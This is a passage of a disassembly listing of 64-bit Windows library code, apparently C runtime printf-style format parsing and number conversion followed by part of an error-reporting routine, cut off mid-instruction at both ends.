   180001e39:	41 b9 0a 00 00 00    	mov    $0xa,%r9d
   180001e3f:	8b 54 24 4c          	mov    0x4c(%rsp),%edx
   180001e43:	b8 00 80 00 00       	mov    $0x8000,%eax
   180001e48:	44 85 e8             	test   %r13d,%eax
   180001e4b:	75 07                	jne    0x180001e54
   180001e4d:	41 0f ba e5 0c       	bt     $0xc,%r13d
   180001e52:	73 09                	jae    0x180001e5d
   180001e54:	4d 8b 06             	mov    (%r14),%r8
   180001e57:	49 83 c6 08          	add    $0x8,%r14
   180001e5b:	eb 2e                	jmp    0x180001e8b
   180001e5d:	49 83 c6 08          	add    $0x8,%r14
   180001e61:	41 f6 c5 20          	test   $0x20,%r13b
   180001e65:	74 14                	je     0x180001e7b
   180001e67:	41 f6 c5 40          	test   $0x40,%r13b
   180001e6b:	74 07                	je     0x180001e74
   180001e6d:	4d 0f bf 46 f8       	movswq -0x8(%r14),%r8
   180001e72:	eb 17                	jmp    0x180001e8b
   180001e74:	45 0f b7 46 f8       	movzwl -0x8(%r14),%r8d
   180001e79:	eb 10                	jmp    0x180001e8b
   180001e7b:	41 f6 c5 40          	test   $0x40,%r13b
   180001e7f:	74 06                	je     0x180001e87
   180001e81:	4d 63 46 f8          	movslq -0x8(%r14),%r8
   180001e85:	eb 04                	jmp    0x180001e8b
   180001e87:	45 8b 46 f8          	mov    -0x8(%r14),%r8d
   180001e8b:	41 f6 c5 40          	test   $0x40,%r13b
   180001e8f:	74 0d                	je     0x180001e9e
   180001e91:	4d 85 c0             	test   %r8,%r8
   180001e94:	79 08                	jns    0x180001e9e
   180001e96:	49 f7 d8             	neg    %r8
   180001e99:	41 0f ba ed 08       	bts    $0x8,%r13d
   180001e9e:	44 85 e8             	test   %r13d,%eax
   180001ea1:	75 0a                	jne    0x180001ead
   180001ea3:	41 0f ba e5 0c       	bt     $0xc,%r13d
   180001ea8:	72 03                	jb     0x180001ead
   180001eaa:	45 8b c0             	mov    %r8d,%r8d
   180001ead:	85 ff                	test   %edi,%edi
   180001eaf:	79 07                	jns    0x180001eb8
   180001eb1:	bf 01 00 00 00       	mov    $0x1,%edi
   180001eb6:	eb 0b                	jmp    0x180001ec3
   180001eb8:	41 83 e5 f7          	and    $0xfffffff7,%r13d
   180001ebc:	41 3b fb             	cmp    %r11d,%edi
   180001ebf:	41 0f 4f fb          	cmovg  %r11d,%edi
   180001ec3:	8b 74 24 64          	mov    0x64(%rsp),%esi
   180001ec7:	49 8b c0             	mov    %r8,%rax
   180001eca:	48 8d 9d bf 01 00 00 	lea    0x1bf(%rbp),%rbx
   180001ed1:	48 f7 d8             	neg    %rax
   180001ed4:	1b c9                	sbb    %ecx,%ecx
   180001ed6:	23 ca                	and    %edx,%ecx
   180001ed8:	89 4c 24 4c          	mov    %ecx,0x4c(%rsp)
   180001edc:	8b cf                	mov    %edi,%ecx
   180001ede:	ff cf                	dec    %edi
   180001ee0:	85 c9                	test   %ecx,%ecx
   180001ee2:	7f 05                	jg     0x180001ee9
   180001ee4:	4d 85 c0             	test   %r8,%r8
   180001ee7:	74 1f                	je     0x180001f08
   180001ee9:	33 d2                	xor    %edx,%edx
   180001eeb:	49 8b c0             	mov    %r8,%rax
   180001eee:	49 63 c9             	movslq %r9d,%rcx
   180001ef1:	48 f7 f1             	div    %rcx
   180001ef4:	4c 8b c0             	mov    %rax,%r8
   180001ef7:	8d 42 30             	lea    0x30(%rdx),%eax
   180001efa:	83 f8 39             	cmp    $0x39,%eax
   180001efd:	7e 02                	jle    0x180001f01
   180001eff:	03 c6                	add    %esi,%eax
   180001f01:	88 03                	mov    %al,(%rbx)
   180001f03:	48 ff cb             	dec    %rbx
   180001f06:	eb d4                	jmp    0x180001edc
   180001f08:	8b 74 24 40          	mov    0x40(%rsp),%esi
   180001f0c:	48 8d 85 bf 01 00 00 	lea    0x1bf(%rbp),%rax
   180001f13:	89 7c 24 44          	mov    %edi,0x44(%rsp)
   180001f17:	2b c3                	sub    %ebx,%eax
   180001f19:	48 ff c3             	inc    %rbx
   180001f1c:	89 44 24 48          	mov    %eax,0x48(%rsp)
   180001f20:	45 85 eb             	test   %r13d,%r11d
   180001f23:	0f 84 17 01 00 00    	je     0x180002040
   180001f29:	85 c0                	test   %eax,%eax
   180001f2b:	74 09                	je     0x180001f36
   180001f2d:	80 3b 30             	cmpb   $0x30,(%rbx)
   180001f30:	0f 84 0a 01 00 00    	je     0x180002040
   180001f36:	48 ff cb             	dec    %rbx
   180001f39:	ff 44 24 48          	incl   0x48(%rsp)
   180001f3d:	c6 03 30             	movb   $0x30,(%rbx)
   180001f40:	e9 fb 00 00 00       	jmp    0x180002040
   180001f45:	75 10                	jne    0x180001f57
   180001f47:	41 80 fc 67          	cmp    $0x67,%r12b
   180001f4b:	75 43                	jne    0x180001f90
   180001f4d:	c7 44 24 44 01 00 00 	movl   $0x1,0x44(%rsp)
   180001f54:	00 
   180001f55:	eb 39                	jmp    0x180001f90
   180001f57:	41 3b fb             	cmp    %r11d,%edi
   180001f5a:	41 0f 4f fb          	cmovg  %r11d,%edi
   180001f5e:	89 7c 24 44          	mov    %edi,0x44(%rsp)
   180001f62:	81 ff a3 00 00 00    	cmp    $0xa3,%edi
   180001f68:	7e 26                	jle    0x180001f90
   180001f6a:	81 c7 5d 01 00 00    	add    $0x15d,%edi
   180001f70:	48 63 cf             	movslq %edi,%rcx
   180001f73:	e8 80 0d 00 00       	call   0x180002cf8
   180001f78:	48 89 45 b0          	mov    %rax,-0x50(%rbp)
   180001f7c:	48 85 c0             	test   %rax,%rax
   180001f7f:	74 07                	je     0x180001f88
   180001f81:	48 8b d8             	mov    %rax,%rbx
   180001f84:	8b f7                	mov    %edi,%esi
   180001f86:	eb 08                	jmp    0x180001f90
   180001f88:	c7 44 24 44 a3 00 00 	movl   $0xa3,0x44(%rsp)
   180001f8f:	00 
   180001f90:	49 8b 06             	mov    (%r14),%rax
   180001f93:	48 8b 0d b6 af 00 00 	mov    0xafb6(%rip),%rcx        # 0x18000cf50
   180001f9a:	49 83 c6 08          	add    $0x8,%r14
   180001f9e:	41 0f be fc          	movsbl %r12b,%edi
   180001fa2:	48 63 f6             	movslq %esi,%rsi
   180001fa5:	48 89 45 b8          	mov    %rax,-0x48(%rbp)
   180001fa9:	ff 15 a9 70 00 00    	call   *0x70a9(%rip)        # 0x180009058
   180001faf:	48 8d 4d 80          	lea    -0x80(%rbp),%rcx
   180001fb3:	44 8b cf             	mov    %edi,%r9d
   180001fb6:	48 89 4c 24 30       	mov    %rcx,0x30(%rsp)
   180001fbb:	8b 4c 24 78          	mov    0x78(%rsp),%ecx
   180001fbf:	4c 8b c6             	mov    %rsi,%r8
   180001fc2:	89 4c 24 28          	mov    %ecx,0x28(%rsp)
   180001fc6:	8b 4c 24 44          	mov    0x44(%rsp),%ecx
   180001fca:	48 8b d3             	mov    %rbx,%rdx
   180001fcd:	89 4c 24 20          	mov    %ecx,0x20(%rsp)
   180001fd1:	48 8d 4d b8          	lea    -0x48(%rbp),%rcx
   180001fd5:	ff d0                	call   *%rax
   180001fd7:	41 8b fd             	mov    %r13d,%edi
   180001fda:	81 e7 80 00 00 00    	and    $0x80,%edi
   180001fe0:	74 1e                	je     0x180002000
   180001fe2:	33 c0                	xor    %eax,%eax
   180001fe4:	39 44 24 44          	cmp    %eax,0x44(%rsp)
   180001fe8:	75 16                	jne    0x180002000
   180001fea:	48 8b 0d 77 af 00 00 	mov    0xaf77(%rip),%rcx        # 0x18000cf68
   180001ff1:	ff 15 61 70 00 00    	call   *0x7061(%rip)        # 0x180009058
   180001ff7:	48 8d 55 80          	lea    -0x80(%rbp),%rdx
   180001ffb:	48 8b cb             	mov    %rbx,%rcx
   180001ffe:	ff d0                	call   *%rax
   180002000:	41 80 fc 67          	cmp    $0x67,%r12b
   180002004:	75 1a                	jne    0x180002020
   180002006:	85 ff                	test   %edi,%edi
   180002008:	75 16                	jne    0x180002020
   18000200a:	48 8b 0d 4f af 00 00 	mov    0xaf4f(%rip),%rcx        # 0x18000cf60
   180002011:	ff 15 41 70 00 00    	call   *0x7041(%rip)        # 0x180009058
   180002017:	48 8d 55 80          	lea    -0x80(%rbp),%rdx
   18000201b:	48 8b cb             	mov    %rbx,%rcx
   18000201e:	ff d0                	call   *%rax
   180002020:	80 3b 2d             	cmpb   $0x2d,(%rbx)
   180002023:	75 08                	jne    0x18000202d
   180002025:	41 0f ba ed 08       	bts    $0x8,%r13d
   18000202a:	48 ff c3             	inc    %rbx
   18000202d:	48 8b cb             	mov    %rbx,%rcx
   180002030:	e8 6b 39 00 00       	call   0x1800059a0
   180002035:	8b 74 24 40          	mov    0x40(%rsp),%esi
   180002039:	45 33 d2             	xor    %r10d,%r10d
   18000203c:	89 44 24 48          	mov    %eax,0x48(%rsp)
   180002040:	44 39 54 24 5c       	cmp    %r10d,0x5c(%rsp)
   180002045:	0f 85 5a 01 00 00    	jne    0x1800021a5
   18000204b:	41 f6 c5 40          	test   $0x40,%r13b
   18000204f:	74 31                	je     0x180002082
   180002051:	41 0f ba e5 08       	bt     $0x8,%r13d
   180002056:	73 07                	jae    0x18000205f
   180002058:	c6 44 24 50 2d       	movb   $0x2d,0x50(%rsp)
   18000205d:	eb 0b                	jmp    0x18000206a
   18000205f:	41 f6 c5 01          	test   $0x1,%r13b
   180002063:	74 10                	je     0x180002075
   180002065:	c6 44 24 50 2b       	movb   $0x2b,0x50(%rsp)
   18000206a:	bf 01 00 00 00       	mov    $0x1,%edi
   18000206f:	89 7c 24 4c          	mov    %edi,0x4c(%rsp)
   180002073:	eb 11                	jmp    0x180002086
   180002075:	41 f6 c5 02          	test   $0x2,%r13b
   180002079:	74 07                	je     0x180002082
   18000207b:	c6 44 24 50 20       	movb   $0x20,0x50(%rsp)
   180002080:	eb e8                	jmp    0x18000206a
   180002082:	8b 7c 24 4c          	mov    0x4c(%rsp),%edi
   180002086:	44 8b 64 24 58       	mov    0x58(%rsp),%r12d
   18000208b:	48 8b 74 24 70       	mov    0x70(%rsp),%rsi
   180002090:	44 2b 64 24 48       	sub    0x48(%rsp),%r12d
   180002095:	44 2b e7             	sub    %edi,%r12d
   180002098:	41 f6 c5 0c          	test   $0xc,%r13b
   18000209c:	75 12                	jne    0x1800020b0
   18000209e:	4c 8d 4c 24 40       	lea    0x40(%rsp),%r9
   1800020a3:	4c 8b c6             	mov    %rsi,%r8
   1800020a6:	41 8b d4             	mov    %r12d,%edx
   1800020a9:	b1 20                	mov    $0x20,%cl
   1800020ab:	e8 f8 f7 ff ff       	call   0x1800018a8
   1800020b0:	48 8b 45 a0          	mov    -0x60(%rbp),%rax
   1800020b4:	4c 8d 4c 24 40       	lea    0x40(%rsp),%r9
   1800020b9:	48 8d 4c 24 50       	lea    0x50(%rsp),%rcx
   1800020be:	4c 8b c6             	mov    %rsi,%r8
   1800020c1:	8b d7                	mov    %edi,%edx
   1800020c3:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   1800020c8:	e8 2f f8 ff ff       	call   0x1800018fc
   1800020cd:	41 f6 c5 08          	test   $0x8,%r13b
   1800020d1:	74 18                	je     0x1800020eb
   1800020d3:	41 f6 c5 04          	test   $0x4,%r13b
   1800020d7:	75 12                	jne    0x1800020eb
   1800020d9:	4c 8d 4c 24 40       	lea    0x40(%rsp),%r9
   1800020de:	4c 8b c6             	mov    %rsi,%r8
   1800020e1:	41 8b d4             	mov    %r12d,%edx
   1800020e4:	b1 30                	mov    $0x30,%cl
   1800020e6:	e8 bd f7 ff ff       	call   0x1800018a8
   1800020eb:	8b 7c 24 48          	mov    0x48(%rsp),%edi
   1800020ef:	33 c0                	xor    %eax,%eax
   1800020f1:	39 44 24 54          	cmp    %eax,0x54(%rsp)
   1800020f5:	74 67                	je     0x18000215e
   1800020f7:	85 ff                	test   %edi,%edi
   1800020f9:	7e 63                	jle    0x18000215e
   1800020fb:	48 8b f3             	mov    %rbx,%rsi
   1800020fe:	44 0f b7 0e          	movzwl (%rsi),%r9d
   180002102:	48 8d 95 c0 01 00 00 	lea    0x1c0(%rbp),%rdx
   180002109:	48 8d 4d a8          	lea    -0x58(%rbp),%rcx
   18000210d:	41 b8 06 00 00 00    	mov    $0x6,%r8d
   180002113:	ff cf                	dec    %edi
   180002115:	48 83 c6 02          	add    $0x2,%rsi
   180002119:	e8 56 38 00 00       	call   0x180005974
   18000211e:	45 33 d2             	xor    %r10d,%r10d
   180002121:	85 c0                	test   %eax,%eax
   180002123:	75 2f                	jne    0x180002154
   180002125:	8b 55 a8             	mov    -0x58(%rbp),%edx
   180002128:	85 d2                	test   %edx,%edx
   18000212a:	74 28                	je     0x180002154
   18000212c:	48 8b 45 a0          	mov    -0x60(%rbp),%rax
   180002130:	4c 8b 44 24 70       	mov    0x70(%rsp),%r8
   180002135:	4c 8d 4c 24 40       	lea    0x40(%rsp),%r9
   18000213a:	48 8d 8d c0 01 00 00 	lea    0x1c0(%rbp),%rcx
   180002141:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   180002146:	e8 b1 f7 ff ff       	call   0x1800018fc
   18000214b:	45 33 d2             	xor    %r10d,%r10d
   18000214e:	85 ff                	test   %edi,%edi
   180002150:	75 ac                	jne    0x1800020fe
   180002152:	eb 28                	jmp    0x18000217c
   180002154:	41 8b f7             	mov    %r15d,%esi
   180002157:	44 89 7c 24 40       	mov    %r15d,0x40(%rsp)
   18000215c:	eb 22                	jmp    0x180002180
   18000215e:	48 8b 45 a0          	mov    -0x60(%rbp),%rax
   180002162:	4c 8d 4c 24 40       	lea    0x40(%rsp),%r9
   180002167:	4c 8b c6             	mov    %rsi,%r8
   18000216a:	8b d7                	mov    %edi,%edx
   18000216c:	48 8b cb             	mov    %rbx,%rcx
   18000216f:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   180002174:	e8 83 f7 ff ff       	call   0x1800018fc
   180002179:	45 33 d2             	xor    %r10d,%r10d
   18000217c:	8b 74 24 40          	mov    0x40(%rsp),%esi
   180002180:	85 f6                	test   %esi,%esi
   180002182:	78 21                	js     0x1800021a5
   180002184:	41 f6 c5 04          	test   $0x4,%r13b
   180002188:	74 1b                	je     0x1800021a5
   18000218a:	4c 8b 44 24 70       	mov    0x70(%rsp),%r8
   18000218f:	4c 8d 4c 24 40       	lea    0x40(%rsp),%r9
   180002194:	41 8b d4             	mov    %r12d,%edx
   180002197:	b1 20                	mov    $0x20,%cl
   180002199:	e8 0a f7 ff ff       	call   0x1800018a8
   18000219e:	8b 74 24 40          	mov    0x40(%rsp),%esi
   1800021a2:	45 33 d2             	xor    %r10d,%r10d
   1800021a5:	48 8b 45 b0          	mov    -0x50(%rbp),%rax
   1800021a9:	48 85 c0             	test   %rax,%rax
   1800021ac:	74 0f                	je     0x1800021bd
   1800021ae:	48 8b c8             	mov    %rax,%rcx
   1800021b1:	e8 02 0b 00 00       	call   0x180002cb8
   1800021b6:	45 33 d2             	xor    %r10d,%r10d
   1800021b9:	4c 89 55 b0          	mov    %r10,-0x50(%rbp)
   1800021bd:	8b 7c 24 44          	mov    0x44(%rsp),%edi
   1800021c1:	4c 8b 44 24 68       	mov    0x68(%rsp),%r8
   1800021c6:	8b 54 24 60          	mov    0x60(%rsp),%edx
   1800021ca:	41 bb 00 02 00 00    	mov    $0x200,%r11d
   1800021d0:	4c 8d 0d 29 de ff ff 	lea    -0x21d7(%rip),%r9        # 0x180000000
   1800021d7:	45 8a 20             	mov    (%r8),%r12b
   1800021da:	45 84 e4             	test   %r12b,%r12b
   1800021dd:	0f 85 47 f9 ff ff    	jne    0x180001b2a
   1800021e3:	44 38 55 98          	cmp    %r10b,-0x68(%rbp)
   1800021e7:	74 0b                	je     0x1800021f4
   1800021e9:	48 8b 4d 90          	mov    -0x70(%rbp),%rcx
   1800021ed:	83 a1 c8 00 00 00 fd 	andl   $0xfffffffd,0xc8(%rcx)
   1800021f4:	8b c6                	mov    %esi,%eax
   1800021f6:	48 8b 8d c8 01 00 00 	mov    0x1c8(%rbp),%rcx
   1800021fd:	48 33 cc             	xor    %rsp,%rcx
   180002200:	e8 5b 38 00 00       	call   0x180005a60
   180002205:	48 8b 9c 24 20 03 00 	mov    0x320(%rsp),%rbx
   18000220c:	00 
   18000220d:	48 81 c4 d0 02 00 00 	add    $0x2d0,%rsp
   180002214:	41 5f                	pop    %r15
   180002216:	41 5e                	pop    %r14
   180002218:	41 5d                	pop    %r13
   18000221a:	41 5c                	pop    %r12
   18000221c:	5f                   	pop    %rdi
   18000221d:	5e                   	pop    %rsi
   18000221e:	5d                   	pop    %rbp
   18000221f:	c3                   	ret
   180002220:	41 80 fc 49          	cmp    $0x49,%r12b
   180002224:	74 38                	je     0x18000225e
   180002226:	41 80 fc 68          	cmp    $0x68,%r12b
   18000222a:	74 29                	je     0x180002255
   18000222c:	41 80 fc 6c          	cmp    $0x6c,%r12b
   180002230:	74 0d                	je     0x18000223f
   180002232:	41 80 fc 77          	cmp    $0x77,%r12b
   180002236:	75 9f                	jne    0x1800021d7
   180002238:	41 0f ba ed 0b       	bts    $0xb,%r13d
   18000223d:	eb 98                	jmp    0x1800021d7
   18000223f:	41 80 38 6c          	cmpb   $0x6c,(%r8)
   180002243:	75 0a                	jne    0x18000224f
   180002245:	49 ff c0             	inc    %r8
   180002248:	41 0f ba ed 0c       	bts    $0xc,%r13d
   18000224d:	eb 88                	jmp    0x1800021d7
   18000224f:	41 83 cd 10          	or     $0x10,%r13d
   180002253:	eb 82                	jmp    0x1800021d7
   180002255:	41 83 cd 20          	or     $0x20,%r13d
   180002259:	e9 79 ff ff ff       	jmp    0x1800021d7
   18000225e:	41 8a 00             	mov    (%r8),%al
   180002261:	41 0f ba ed 0f       	bts    $0xf,%r13d
   180002266:	3c 36                	cmp    $0x36,%al
   180002268:	75 15                	jne    0x18000227f
   18000226a:	41 80 78 01 34       	cmpb   $0x34,0x1(%r8)
   18000226f:	75 0e                	jne    0x18000227f
   180002271:	49 83 c0 02          	add    $0x2,%r8
   180002275:	41 0f ba ed 0f       	bts    $0xf,%r13d
   18000227a:	e9 58 ff ff ff       	jmp    0x1800021d7
   18000227f:	3c 33                	cmp    $0x33,%al
   180002281:	75 15                	jne    0x180002298
   180002283:	41 80 78 01 32       	cmpb   $0x32,0x1(%r8)
   180002288:	75 0e                	jne    0x180002298
   18000228a:	49 83 c0 02          	add    $0x2,%r8
   18000228e:	41 0f ba f5 0f       	btr    $0xf,%r13d
   180002293:	e9 3f ff ff ff       	jmp    0x1800021d7
   180002298:	3c 64                	cmp    $0x64,%al
   18000229a:	0f 84 37 ff ff ff    	je     0x1800021d7
   1800022a0:	3c 69                	cmp    $0x69,%al
   1800022a2:	0f 84 2f ff ff ff    	je     0x1800021d7
   1800022a8:	3c 6f                	cmp    $0x6f,%al
   1800022aa:	0f 84 27 ff ff ff    	je     0x1800021d7
   1800022b0:	3c 75                	cmp    $0x75,%al
   1800022b2:	0f 84 1f ff ff ff    	je     0x1800021d7
   1800022b8:	3c 78                	cmp    $0x78,%al
   1800022ba:	0f 84 17 ff ff ff    	je     0x1800021d7
   1800022c0:	3c 58                	cmp    $0x58,%al
   1800022c2:	0f 84 0f ff ff ff    	je     0x1800021d7
   1800022c8:	44 89 54 24 60       	mov    %r10d,0x60(%rsp)
   1800022cd:	48 8d 55 80          	lea    -0x80(%rbp),%rdx
   1800022d1:	41 0f b6 cc          	movzbl %r12b,%ecx
   1800022d5:	44 89 54 24 54       	mov    %r10d,0x54(%rsp)
   1800022da:	e8 f1 33 00 00       	call   0x1800056d0
   1800022df:	33 f6                	xor    %esi,%esi
   1800022e1:	85 c0                	test   %eax,%eax
   1800022e3:	74 2b                	je     0x180002310
   1800022e5:	48 8b 54 24 70       	mov    0x70(%rsp),%rdx
   1800022ea:	4c 8d 44 24 40       	lea    0x40(%rsp),%r8
   1800022ef:	41 8a cc             	mov    %r12b,%cl
   1800022f2:	e8 69 f5 ff ff       	call   0x180001860
   1800022f7:	48 8b 54 24 68       	mov    0x68(%rsp),%rdx
   1800022fc:	44 8a 22             	mov    (%rdx),%r12b
   1800022ff:	48 ff c2             	inc    %rdx
   180002302:	48 89 54 24 68       	mov    %rdx,0x68(%rsp)
   180002307:	45 84 e4             	test   %r12b,%r12b
   18000230a:	0f 84 17 01 00 00    	je     0x180002427
   180002310:	48 8b 54 24 70       	mov    0x70(%rsp),%rdx
   180002315:	4c 8d 44 24 40       	lea    0x40(%rsp),%r8
   18000231a:	41 8a cc             	mov    %r12b,%cl
   18000231d:	e8 3e f5 ff ff       	call   0x180001860
   180002322:	8b 74 24 40          	mov    0x40(%rsp),%esi
   180002326:	45 33 d2             	xor    %r10d,%r10d
   180002329:	e9 93 fe ff ff       	jmp    0x1800021c1
   18000232e:	41 80 fc 2a          	cmp    $0x2a,%r12b
   180002332:	75 20                	jne    0x180002354
   180002334:	41 8b 3e             	mov    (%r14),%edi
   180002337:	49 83 c6 08          	add    $0x8,%r14
   18000233b:	89 7c 24 44          	mov    %edi,0x44(%rsp)
   18000233f:	85 ff                	test   %edi,%edi
   180002341:	0f 89 90 fe ff ff    	jns    0x1800021d7
   180002347:	41 8b ff             	mov    %r15d,%edi
   18000234a:	44 89 7c 24 44       	mov    %r15d,0x44(%rsp)
   18000234f:	e9 83 fe ff ff       	jmp    0x1800021d7
   180002354:	8d 0c bf             	lea    (%rdi,%rdi,4),%ecx
   180002357:	41 0f be c4          	movsbl %r12b,%eax
   18000235b:	8d 7c 48 d0          	lea    -0x30(%rax,%rcx,2),%edi
   18000235f:	89 7c 24 44          	mov    %edi,0x44(%rsp)
   180002363:	e9 6f fe ff ff       	jmp    0x1800021d7
   180002368:	41 8b fa             	mov    %r10d,%edi
   18000236b:	44 89 54 24 44       	mov    %r10d,0x44(%rsp)
   180002370:	e9 62 fe ff ff       	jmp    0x1800021d7
   180002375:	41 80 fc 2a          	cmp    $0x2a,%r12b
   180002379:	75 1b                	jne    0x180002396
   18000237b:	41 8b 06             	mov    (%r14),%eax
   18000237e:	49 83 c6 08          	add    $0x8,%r14
   180002382:	89 44 24 58          	mov    %eax,0x58(%rsp)
   180002386:	85 c0                	test   %eax,%eax
   180002388:	0f 89 49 fe ff ff    	jns    0x1800021d7
   18000238e:	41 83 cd 04          	or     $0x4,%r13d
   180002392:	f7 d8                	neg    %eax
   180002394:	eb 0f                	jmp    0x1800023a5
   180002396:	8b 44 24 58          	mov    0x58(%rsp),%eax
   18000239a:	8d 0c 80             	lea    (%rax,%rax,4),%ecx
   18000239d:	41 0f be c4          	movsbl %r12b,%eax
   1800023a1:	8d 44 48 d0          	lea    -0x30(%rax,%rcx,2),%eax
   1800023a5:	89 44 24 58          	mov    %eax,0x58(%rsp)
   1800023a9:	e9 29 fe ff ff       	jmp    0x1800021d7
   1800023ae:	41 80 fc 20          	cmp    $0x20,%r12b
   1800023b2:	74 41                	je     0x1800023f5
   1800023b4:	41 80 fc 23          	cmp    $0x23,%r12b
   1800023b8:	74 31                	je     0x1800023eb
   1800023ba:	41 80 fc 2b          	cmp    $0x2b,%r12b
   1800023be:	74 22                	je     0x1800023e2
   1800023c0:	41 80 fc 2d          	cmp    $0x2d,%r12b
   1800023c4:	74 13                	je     0x1800023d9
   1800023c6:	41 80 fc 30          	cmp    $0x30,%r12b
   1800023ca:	0f 85 07 fe ff ff    	jne    0x1800021d7
   1800023d0:	41 83 cd 08          	or     $0x8,%r13d
   1800023d4:	e9 fe fd ff ff       	jmp    0x1800021d7
   1800023d9:	41 83 cd 04          	or     $0x4,%r13d
   1800023dd:	e9 f5 fd ff ff       	jmp    0x1800021d7
   1800023e2:	41 83 cd 01          	or     $0x1,%r13d
   1800023e6:	e9 ec fd ff ff       	jmp    0x1800021d7
   1800023eb:	41 0f ba ed 07       	bts    $0x7,%r13d
   1800023f0:	e9 e2 fd ff ff       	jmp    0x1800021d7
   1800023f5:	41 83 cd 02          	or     $0x2,%r13d
   1800023f9:	e9 d9 fd ff ff       	jmp    0x1800021d7
   1800023fe:	44 89 54 24 78       	mov    %r10d,0x78(%rsp)
   180002403:	44 89 54 24 5c       	mov    %r10d,0x5c(%rsp)
   180002408:	44 89 54 24 58       	mov    %r10d,0x58(%rsp)
   18000240d:	44 89 54 24 4c       	mov    %r10d,0x4c(%rsp)
   180002412:	45 8b ea             	mov    %r10d,%r13d
   180002415:	41 8b ff             	mov    %r15d,%edi
   180002418:	44 89 7c 24 44       	mov    %r15d,0x44(%rsp)
   18000241d:	44 89 54 24 54       	mov    %r10d,0x54(%rsp)
   180002422:	e9 b0 fd ff ff       	jmp    0x1800021d7
   180002427:	e8 74 02 00 00       	call   0x1800026a0
   18000242c:	c7 00 16 00 00 00    	movl   $0x16,(%rax)
   180002432:	e8 01 02 00 00       	call   0x180002638
   180002437:	40 38 75 98          	cmp    %sil,-0x68(%rbp)
   18000243b:	e9 9e f6 ff ff       	jmp    0x180001ade
   180002440:	48 89 0d 89 af 00 00 	mov    %rcx,0xaf89(%rip)        # 0x18000d3d0
   180002447:	c3                   	ret
   180002448:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   18000244d:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   180002452:	55                   	push   %rbp
   180002453:	57                   	push   %rdi
   180002454:	41 54                	push   %r12
   180002456:	48 8d ac 24 10 fb ff 	lea    -0x4f0(%rsp),%rbp
   18000245d:	ff 
   18000245e:	48 81 ec f0 05 00 00 	sub    $0x5f0,%rsp
   180002465:	48 8b 05 04 ab 00 00 	mov    0xab04(%rip),%rax        # 0x18000cf70
   18000246c:	48 33 c4             	xor    %rsp,%rax
   18000246f:	48 89 85 e0 04 00 00 	mov    %rax,0x4e0(%rbp)
   180002476:	41 8b f8             	mov    %r8d,%edi
   180002479:	8b f2                	mov    %edx,%esi
   18000247b:	8b d9                	mov    %ecx,%ebx
   18000247d:	83 f9 ff             	cmp    $0xffffffff,%ecx
   180002480:	74 05                	je     0x180002487
   180002482:	e8 f9 35 00 00       	call   0x180005a80
   180002487:	83 64 24 70 00       	andl   $0x0,0x70(%rsp)
   18000248c:	48 8d 4c 24 74       	lea    0x74(%rsp),%rcx
   180002491:	33 d2                	xor    %edx,%edx
   180002493:	41 b8 94 00 00 00    	mov    $0x94,%r8d
   180002499:	e8 52 ed ff ff       	call   0x1800011f0
   18000249e:	4c 8d 5c 24 70       	lea    0x70(%rsp),%r11
   1800024a3:	48 8d 45 10          	lea    0x10(%rbp),%rax
   1800024a7:	48 8d 4d 10          	lea    0x10(%rbp),%rcx
   1800024ab:	4c 89 5c 24 48       	mov    %r11,0x48(%rsp)
   1800024b0:	48 89 44 24 50       	mov    %rax,0x50(%rsp)
   1800024b5:	ff 15 cd 6b 00 00    	call   *0x6bcd(%rip)        # 0x180009088
   1800024bb:	4c 8b a5 08 01 00 00 	mov    0x108(%rbp),%r12
   1800024c2:	48 8d 54 24 40       	lea    0x40(%rsp),%rdx
   1800024c7:	49 8b cc             	mov    %r12,%rcx
   1800024ca:	45 33 c0             	xor    %r8d,%r8d
   1800024cd:	e8 6a 64 00 00       	call   0x18000893c
   1800024d2:	48 85 c0             	test   %rax,%rax
   1800024d5:	74 37                	je     0x18000250e
   1800024d7:	48 83 64 24 38 00    	andq   $0x0,0x38(%rsp)
   1800024dd:	48 8b 54 24 40       	mov    0x40(%rsp),%rdx
   1800024e2:	48 8d 4c 24 60       	lea    0x60(%rsp),%rcx
   1800024e7:	48 89 4c 24 30       	mov    %rcx,0x30(%rsp)
   1800024ec:	48 8d 4c 24 58       	lea    0x58(%rsp),%rcx
   1800024f1:	4c 8b c8             	mov    %rax,%r9
   1800024f4:	48 89 4c 24 28       	mov    %rcx,0x28(%rsp)
   1800024f9:	48 8d 4d 10          	lea    0x10(%rbp),%rcx
   1800024fd:	4d 8b c4             	mov    %r12,%r8
   180002500:	48 89 4c 24 20       	mov    %rcx,0x20(%rsp)
   180002505:	33 c9                	xor    %ecx,%ecx
   180002507:	e8 2a 64 00 00       	call   0x180008936
   18000250c:	eb 1c                	jmp    0x18000252a
   18000250e:	48 8b 85 08 05 00 00 	mov    0x508(%rbp),%rax
   180002515:	48 89 85 08 01 00 00 	mov    %rax,0x108(%rbp)
   18000251c:	48 8d 85 08 05 00 00 	lea    0x508(%rbp),%rax
   180002523:	48 89 85 a8 00 00 00 	mov    %rax,0xa8(%rbp)
   18000252a:	48 8b 85 08 05 00 00 	mov    0x508(%rbp),%rax
   180002531:	89 74 24 70          	mov    %esi,0x70(%rsp)
   180002535:	89 7c 24 74          	mov    %edi,0x74(%rsp)
   180002539:	48 89 45 80          	mov    %rax,-0x80(%rbp)
   18000253d:	ff 15 2d 6b 00 00    	call   *0x6b2d(%rip)        # 0x180009070
   180002543:	33 c9                	xor    %ecx,%ecx
   180002545:	8b f8                	mov    %eax,%edi
   180002547:	ff 15 1b 6b 00 00    	call   *0x6b1b(%rip)        # 0x180009068
   18000254d:	48 8d 4c 24 48       	lea    0x48(%rsp),%rcx
   180002552:	ff 15 08 6b 00 00    	call   *0x6b08(%rip)        # 0x180009060
   180002558:	85 c0                	test   %eax,%eax
   18000255a:	75 10                	jne    0x18000256c
   18000255c:	85 ff                	test   %edi,%edi
   18000255e:	75 0c                	jne    0x18000256c
   180002560:	83 fb ff             	cmp    $0xffffffff,%ebx
   180002563:	74 07                	je     0x18000256c
   180002565:	8b cb                	mov    %ebx,%ecx
   180002567:	e8 14 35 00 00       	call   0x180005a80
   18000256c:	48 8b 8d e0 04 00 00 	mov    0x4e0(%rbp),%rcx
   180002573:	48 33 cc             	xor    %rsp,%rcx
   180002576:	e8 e5 34 00 00       	call   0x180005a60
   18000257b:	4c 8d 9c 24 f0 05 00 	lea    0x5f0(%rsp),%r11
   180002582:	00 
